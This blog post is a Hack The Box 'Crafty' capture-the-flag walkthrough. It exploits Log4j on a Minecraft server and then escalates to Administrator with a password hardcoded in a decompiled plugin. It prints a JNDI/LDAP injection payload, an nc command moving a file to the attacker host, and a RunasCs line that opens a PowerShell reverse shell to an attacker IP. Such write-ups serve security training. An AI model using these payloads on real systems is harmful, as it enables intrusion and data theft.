---
layout: post
title:  "HTB: Crafty"
date:   2024-08-04
description: In Crafty, I'll exploit the infamous Log4j RCE exploit (CVE-2021-44228) on a Minecraft server to gain a shell as the user. Then, I'll discover a jar file in one of the user's directories, decompile it, and discover a hardcoded password which allows me to gain a shell as the Administrator.
tags: htb nmap minecraft log4j cve-2021-44228 hardcoded-credentials runascs ncat
---

## Overview

In Crafty, I'll exploit the infamous Log4j RCE exploit (CVE-2021-44228) on a Minecraft server to gain a shell as the user. Then, I'll discover a jar file in one of the user's directories, decompile it, and discover a hardcoded password which allows me to gain a shell as the Administrator.

## Recon

### nmap

```
$ sudo nmap -p 80,25565 -sSCV -oA nmap/crafty 10.10.11.249
Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-03-24 00:33 +08
Nmap scan report for 10.10.11.249
Host is up (0.015s latency).
Not shown: 65533 filtered tcp ports (no-response)
PORT      STATE SERVICE   VERSION
80/tcp    open  http      Microsoft IIS httpd 10.0
25565/tcp open  minecraft Minecraft 1.16.5 (Protocol: 127, Message: Crafty Server, Users: 1/100)
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 111.72 seconds
```

Interestingly, we have a Minecraft server running on port 25565!

### HTTP (TCP 80)

Visiting the website at `http://10.10.11.249`, we get the following landing page.
![Home page](/assets/img/2024-08-04-htb-crafty/home-page.png)

There isn't much we can do on this website, I tried adding `play.crafty.htb` to my hosts file and visiting that page, but got nothing. It's likely for joining the Minecraft server.

### Minecraft (TCP 25565)

Since this is Minecraft, it's worth trying the infamous Log4j exploit [(CVE-2021-4428)](https://nvd.nist.gov/vuln/detail/CVE-2021-44228).

To perform the exploit, you can use the Minecraft client, join the server and send the payload in the server chat.
But I didn't own a copy of Minecraft and didn't want sail the seven seas, so I'll use a Python library to talk with the server.

## Shell as svc_minecraft

I'll use the Log4j exploit from [here](https://github.com/kozmer/log4j-shell-poc).
To send the payload to the server, I'll use [pyCraft](https://github.com/ammaraskar/pyCraft).

Log4j exploit:
```
$ python3 poc.py --userip 10.10.16.57 --webport 8000 --lport 9001

[!] CVE: CVE-2021-44228                                                                                                                                                                      
[!] Github repo: https://github.com/kozmer/log4j-shell-poc                                                                                                                                   
                                                                                                                                                                                             
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
[+] Exploit java class created success
[+] Setting up LDAP server
                                                                                                                                                                                             
[+] Send me: ${jndi:ldap://10.10.16.57:1389/a}
                                                                                                                                                                                             
[+] Starting Webserver on port 8000 http://0.0.0.0:8000
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings=on -Dswing.aatext=true
Listening on 0.0.0.0:1389
```

Start a netcat listener:
```
$ rlwrap nc -lvnp 9001
```

Send the payload to the server chat:
```
$ python3 start.py 
Enter your username: benkyou
Enter your password (leave blank for offline mode): 
Enter server host or host:port (enclose IPv6 addresses in square brackets): 10.10.11.249:25565
Connecting in offline mode...
Connected.
${jndi:ldap://10.10.16.57:1389/a}
```

We get a shell back as svc_minecraft and get the user flag.
![User flag](/assets/img/2024-08-04-htb-crafty/user-flag.png)

## Shell as Administrator

Enumerating svc_minecraft's directories, we notice an out-of-place file (`playcounter-1.0-SNAPSHOT.jar`) in `C:\Users\svc_minecraft\server\plugins\`.

I'll upload netcat to the box and transfer the file to my host.
```
# Host
$ nc -lvnp 4242 > playcounter-1.0-SNAPSHOT.jar 
```

```
# Target
C:\Windows\Temp> nc64.exe 10.10.16.57 4242 < C:\Users\svc_minecraft\server\plugins\playcounter-1.0-SNAPSHOT.jar
```

### Analysing playcounter-1.0-SNAPSHOT.jar

I'll decompile the jar file for analysis.

We find a hardcoded password in the `onEnable` method of the `Playercounter` class.

![Hardcoded password](/assets/img/2024-08-04-htb-crafty/hardcoded-password.png)

Looking at `connect` confirms that the third argument seen earlier is indeed the password.

![Password argument](/assets/img/2024-08-04-htb-crafty/hardcoded-password-1.png)

To try the password against the local Adminstrator account, I'll upload [RunasCs](https://github.com/antonioCoco/RunasCs) to the box. Then, I'll use a reverse shell to gain access as the Administrator.

```
# Host
$ nc -lvnp 9002
```

```
# Target
C:\Windows\Temp> RunasCs.exe Administrator s67u84zKq8IXw "nc64.exe -e powershell.exe 10.10.16.57 9002" 
```

We successfully gain a shell as Administrator and obtain the root flag.

![Root flag](/assets/img/2024-08-04-htb-crafty/root-flag.png)